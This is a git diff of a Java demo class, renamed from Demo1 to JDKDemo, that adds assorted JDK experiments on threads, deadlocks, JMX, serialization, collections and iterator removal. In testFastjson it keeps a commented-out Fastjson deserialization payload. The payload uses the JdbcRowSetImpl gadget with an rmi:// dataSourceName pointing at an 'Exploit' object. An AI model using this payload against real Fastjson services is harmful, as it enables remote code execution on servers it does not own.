@@ -1,15 +1,24 @@
 package com.dawell.java.demo1;
 
+import com.alibaba.fastjson.JSON;
 import org.springframework.core.ResolvableType;
+import org.springframework.util.StopWatch;
 
-import java.io.Serializable;
+import java.io.*;
 import java.lang.annotation.ElementType;
 import java.lang.annotation.Retention;
 import java.lang.annotation.RetentionPolicy;
 import java.lang.annotation.Target;
+import java.lang.management.*;
+import java.lang.ref.ReferenceQueue;
+import java.lang.ref.WeakReference;
 import java.lang.reflect.Field;
 import java.lang.reflect.Proxy;
 import java.lang.reflect.Type;
+import java.time.Instant;
+import java.time.LocalDateTime;
+import java.time.ZoneId;
+import java.time.ZoneOffset;
 import java.util.*;
 import java.util.concurrent.Callable;
 import java.util.concurrent.ForkJoinPool;
@@ -18,9 +27,9 @@ import java.util.concurrent.RecursiveTask;
 import java.util.function.Consumer;
 import java.util.stream.Stream;
 
-@Demo1.DemoAnnotation(value = "test")
+@JDKDemo.DemoAnnotation(value = "test")
 //@Slf4j
-public class Demo1 {
+public class JDKDemo {
 
     @Retention(RetentionPolicy.RUNTIME)
     @Target(ElementType.TYPE)
@@ -30,7 +39,7 @@ public class Demo1 {
 
     private Map<String, Integer> myMap;
 
-    public static void main(String[] args) throws NoSuchFieldException, InterruptedException, IllegalAccessException, CloneNotSupportedException {
+    public static void main(String[] args) throws Exception {
 
         testSort();
 
@@ -62,18 +71,296 @@ public class Demo1 {
 
         testAnnotation();
 
-        Module module = Demo1.class.getModule();
+        testModule();
+
+        testMapGet();
+
+        testValueOf();
+
+        testDeepCloneInSerialization();
+
+        testSystemCopy();
+
+        testCheckedList();
+
+        testRefQueue();
+
+        testListRemove();
+
+        testThread();
+
+        testJMX();
+
+        testFastjson();
+
+        testSynchronized();
+
+        testDeadLock();
+
+
+
+    }
+
+    private static void testDeadLock() {
+        Object m1 = new Object();
+        Object m2 = new Object();
+
+        new Thread(()->{
+
+            synchronized (m1){
+                System.out.println(Thread.currentThread().getId()+" hold m1");
+                synchronized (m2){
+                    System.out.println(Thread.currentThread().getId()+" hold m2");
+                }
+            }
+
+        }).start();
+
+        new Thread(()->{
+
+//            synchronized (m2){
+//                System.out.println(Thread.currentThread().getId()+" hold m2");
+//                synchronized (m1){
+//                    System.out.println(Thread.currentThread().getId()+" hold m1");
+//                }
+//            }
+
+        }).start();
+
+//        Thread.onSpinWait();
+    }
+
+    @Override
+    protected void finalize() throws Throwable {
+        System.out.println("Thread execute finalize!");
+    }
+
+    private static void testSynchronized() {
+        Object obj = new Object();
+        synchronized (obj){
+            echo("Hello");
+        }
+
+        int count = 1000000;
+        List list  = new ArrayList();
+        List vector  = Collections.synchronizedList(new ArrayList());
+
+        testSpeed(count, list);
+        testSpeed(count, vector);
+
+        System.gc();
+
+        testSpeed(count, list);
+        testSpeed(count, vector);
+    }
+
+    private static void testSpeed(int count, List list) {
+        StopWatch sw = new StopWatch();
+        sw.start();
+        for (int i = 0; i < count; i++) {
+            list.add(i);
+        }
+        sw.stop();
+        System.out.println(list.getClass().getName()+" cost: "+sw.getTotalTimeMillis());
+    }
+
+    private synchronized static void echo(String msg){
+        System.out.println(msg);
+    }
+
+    private static void testJMX() {
+        long pid = ProcessHandle.current().pid();
+        System.out.println(pid);
+
+        RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();
+        System.out.println(runtimeMXBean.getName());
+        System.out.println(runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")));
+
+        System.out.println(runtimeMXBean.getPid());
+
+        LocalDateTime localDateTime = LocalDateTime.ofInstant(Instant.ofEpochMilli(runtimeMXBean.getStartTime()),ZoneId.systemDefault());
+        System.out.println(runtimeMXBean.getStartTime());
+        System.out.println(localDateTime);
+        System.out.println(runtimeMXBean.getUptime());
+
+
+        ThreadMXBean threadMXBean = ManagementFactory.getThreadMXBean();
+        System.out.println(threadMXBean.getThreadCount());
+        MemoryMXBean memoryMXBean = ManagementFactory.getMemoryMXBean();
+        System.out.println(memoryMXBean.getHeapMemoryUsage());
+        OperatingSystemMXBean osMXBean = ManagementFactory.getOperatingSystemMXBean();
+        System.out.println(osMXBean.getName());
+
+//        System.exit(9);
+    }
+
+    private static void testFastjson() {
+    /* String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\"," +
+             " \"autoCommit\":true}";
+     JSON.parse(payload);*/
+    }
+
+    private static void testThread() throws InterruptedException {
+        StackWalker stackWalker = StackWalker.getInstance();
+        stackWalker.forEach(System.out::println);
+
+        Thread thread = new Thread(() -> {
+            if (Thread.currentThread().isInterrupted()) {
+                System.out.println("被中止");
+                return;
+            }
+            System.out.println("执行中");
+        });
+        thread.start();
+        thread.interrupt();
+        thread.join();
+    }
+
+    private static void testListRemove() {
+        List<Integer> list = new ArrayList<>(List.of(1, 2, 3));
+
+        Iterator<Integer> iterator = list.iterator();
+        while (iterator.hasNext()) {
+            iterator.next();
+            iterator.remove();
+        }
+        System.out.println(list);
+
+        List<Integer> list2 = new ArrayList<>(List.of(1, 2, 3));
+
+        // 注意size不要写到for里面，因为删除的时候会变化
+        int size = list2.size();
+        for (int i = 0; i < size; i++) {
+            list2.remove(0);
+        }
+        System.out.println("final: " + list2);
+
+        List<Integer> list3 = new ArrayList<>(List.of(1, 2, 3));
+        try {
+            for (Integer integer : list3) {
+                list3.remove(integer);
+            }
+        } catch (ConcurrentModificationException e) {
+            System.out.println("remove exception: " + e.getClass().getSimpleName());
+        }
+
+
+        List<Integer> list4 = new ArrayList<>(List.of(1, 2, 3));
+
+        Iterator<Integer> iterator2 = list4.iterator();
+        while (iterator2.hasNext()) {
+//            list4.add(4);// ConcurrentModificationException
+//            list4.remove(0);// ConcurrentModificationException
+//            iterator2.remove();// IllegalStateException
+            iterator2.next();
+//            list4.add(4);// 第二次循环时ConcurrentModificationException
+            iterator2.remove();
+        }
+    }
+
+    private static void testRefQueue() {
+        ReferenceQueue queue = new ReferenceQueue();
+        WeakReference<String> ref = new WeakReference<>("123", queue);
+        System.out.println(ref.get());
+        ref.enqueue();
+        System.out.println(queue.poll());
+    }
+
+    private static void testCheckedList() {
+        List<Integer> list = new ArrayList<>(List.of(1, 2, 3));
+        List list2 = list;
+        list2.add("A");
+        System.out.println(list2);
+
+        list = Collections.checkedList(list, Integer.class);
+        list2 = list;
+        try {
+            list2.add("A");
+        } catch (Exception e) {
+            System.out.println(e.getMessage());
+        }
+    }
+
+    private static void testSystemCopy() {
+        InnerObj[] array1 = {new InnerObj(1), new InnerObj(2), new InnerObj(3), new InnerObj(4), new InnerObj(5)};
+        InnerObj[] array2 = Arrays.copyOf(array1, 5);
+        for (int i = 0; i < array1.length; i++) {
+            System.out.println(array1[i] == array2[i]);
+        }
+    }
+
+    static class InnerObj {
+        Integer a;
+
+        public InnerObj(Integer a) {
+            this.a = a;
+        }
+    }
+
+    private static void testDeepCloneInSerialization() throws IOException, ClassNotFoundException {
+        List<String> list = new ArrayList<>();
+        list.add("123");
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(list);
+        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
+        ObjectInputStream ois = new ObjectInputStream(bais);
+        List<String> clone = (List<String>) ois.readObject();
+        System.out.println(clone);
+    }
+
+    private static void testMapGet() {
+        System.out.println("---------------");
+        Map<Integer, String> map = Map.of(1000, "123");
+        System.out.println(map.get(1000));
+        System.out.println(map.get(new Key(1000)));
+    }
+
+    private static void testValueOf() {
+        Integer a = (Integer) 1000;
+        Integer b = (Integer) 1000;
+        System.out.println(a == b);
+        Integer a1 = (Integer) 1;
+        Integer b2 = (Integer) 1;
+        System.out.println(a1 == b2);
+    }
+
+    private static class Key {
+        private final int value;
+
+        private Key(int value) {
+            this.value = value;
+        }
+
+        @Override
+        public boolean equals(Object o) {
+            if (this == o) {
+                return true;
+            }
+            if (o instanceof Integer) {
+                return this.value == ((Integer) o).intValue();
+            }
+            return false;
+        }
+
+        @Override
+        public int hashCode() {
+            return value;
+        }
+    }
+
+    private static void testModule() {
+        Module module = JDKDemo.class.getModule();
         // auto module 返回null
         System.out.println(module.getName());
         System.out.println(module.getDescriptor());
-
     }
 
     private static void testAnnotation() {
         LinkedList<Integer> list = Stream.of(1, 2, 3, 4, 5)
                 .collect(LinkedList::new, List::add, List::addAll);
 
-        DemoAnnotation annotation = Demo1.class.getDeclaredAnnotation(DemoAnnotation.class);
+        DemoAnnotation annotation = JDKDemo.class.getDeclaredAnnotation(DemoAnnotation.class);
         System.out.println(annotation.getClass().toString());
         System.out.println((Proxy.getInvocationHandler(annotation).toString()));
     }
@@ -119,8 +406,8 @@ public class Demo1 {
         Set<String> b = new HashSet<>();
         add(b, "123");
         add2(b, "456");
-        foreach(b, Demo1::print2);
-        foreach(b, Demo1::print3);
+        foreach(b, JDKDemo::print2);
+        foreach(b, JDKDemo::print3);
 
         String aStr = a.get(0);
         System.out.println(aStr);
@@ -324,7 +611,7 @@ public class Demo1 {
     }
 
     private static void testResolvableType() throws NoSuchFieldException {
-        ResolvableType t = ResolvableType.forField(Demo1.class.getDeclaredField("myMap"));
+        ResolvableType t = ResolvableType.forField(JDKDemo.class.getDeclaredField("myMap"));
         System.out.println(Objects.toString(t.getSuperType()));
         System.out.println(Objects.toString(t.asMap()));
         System.out.println(Objects.toString(t.getGeneric(0).resolve()));
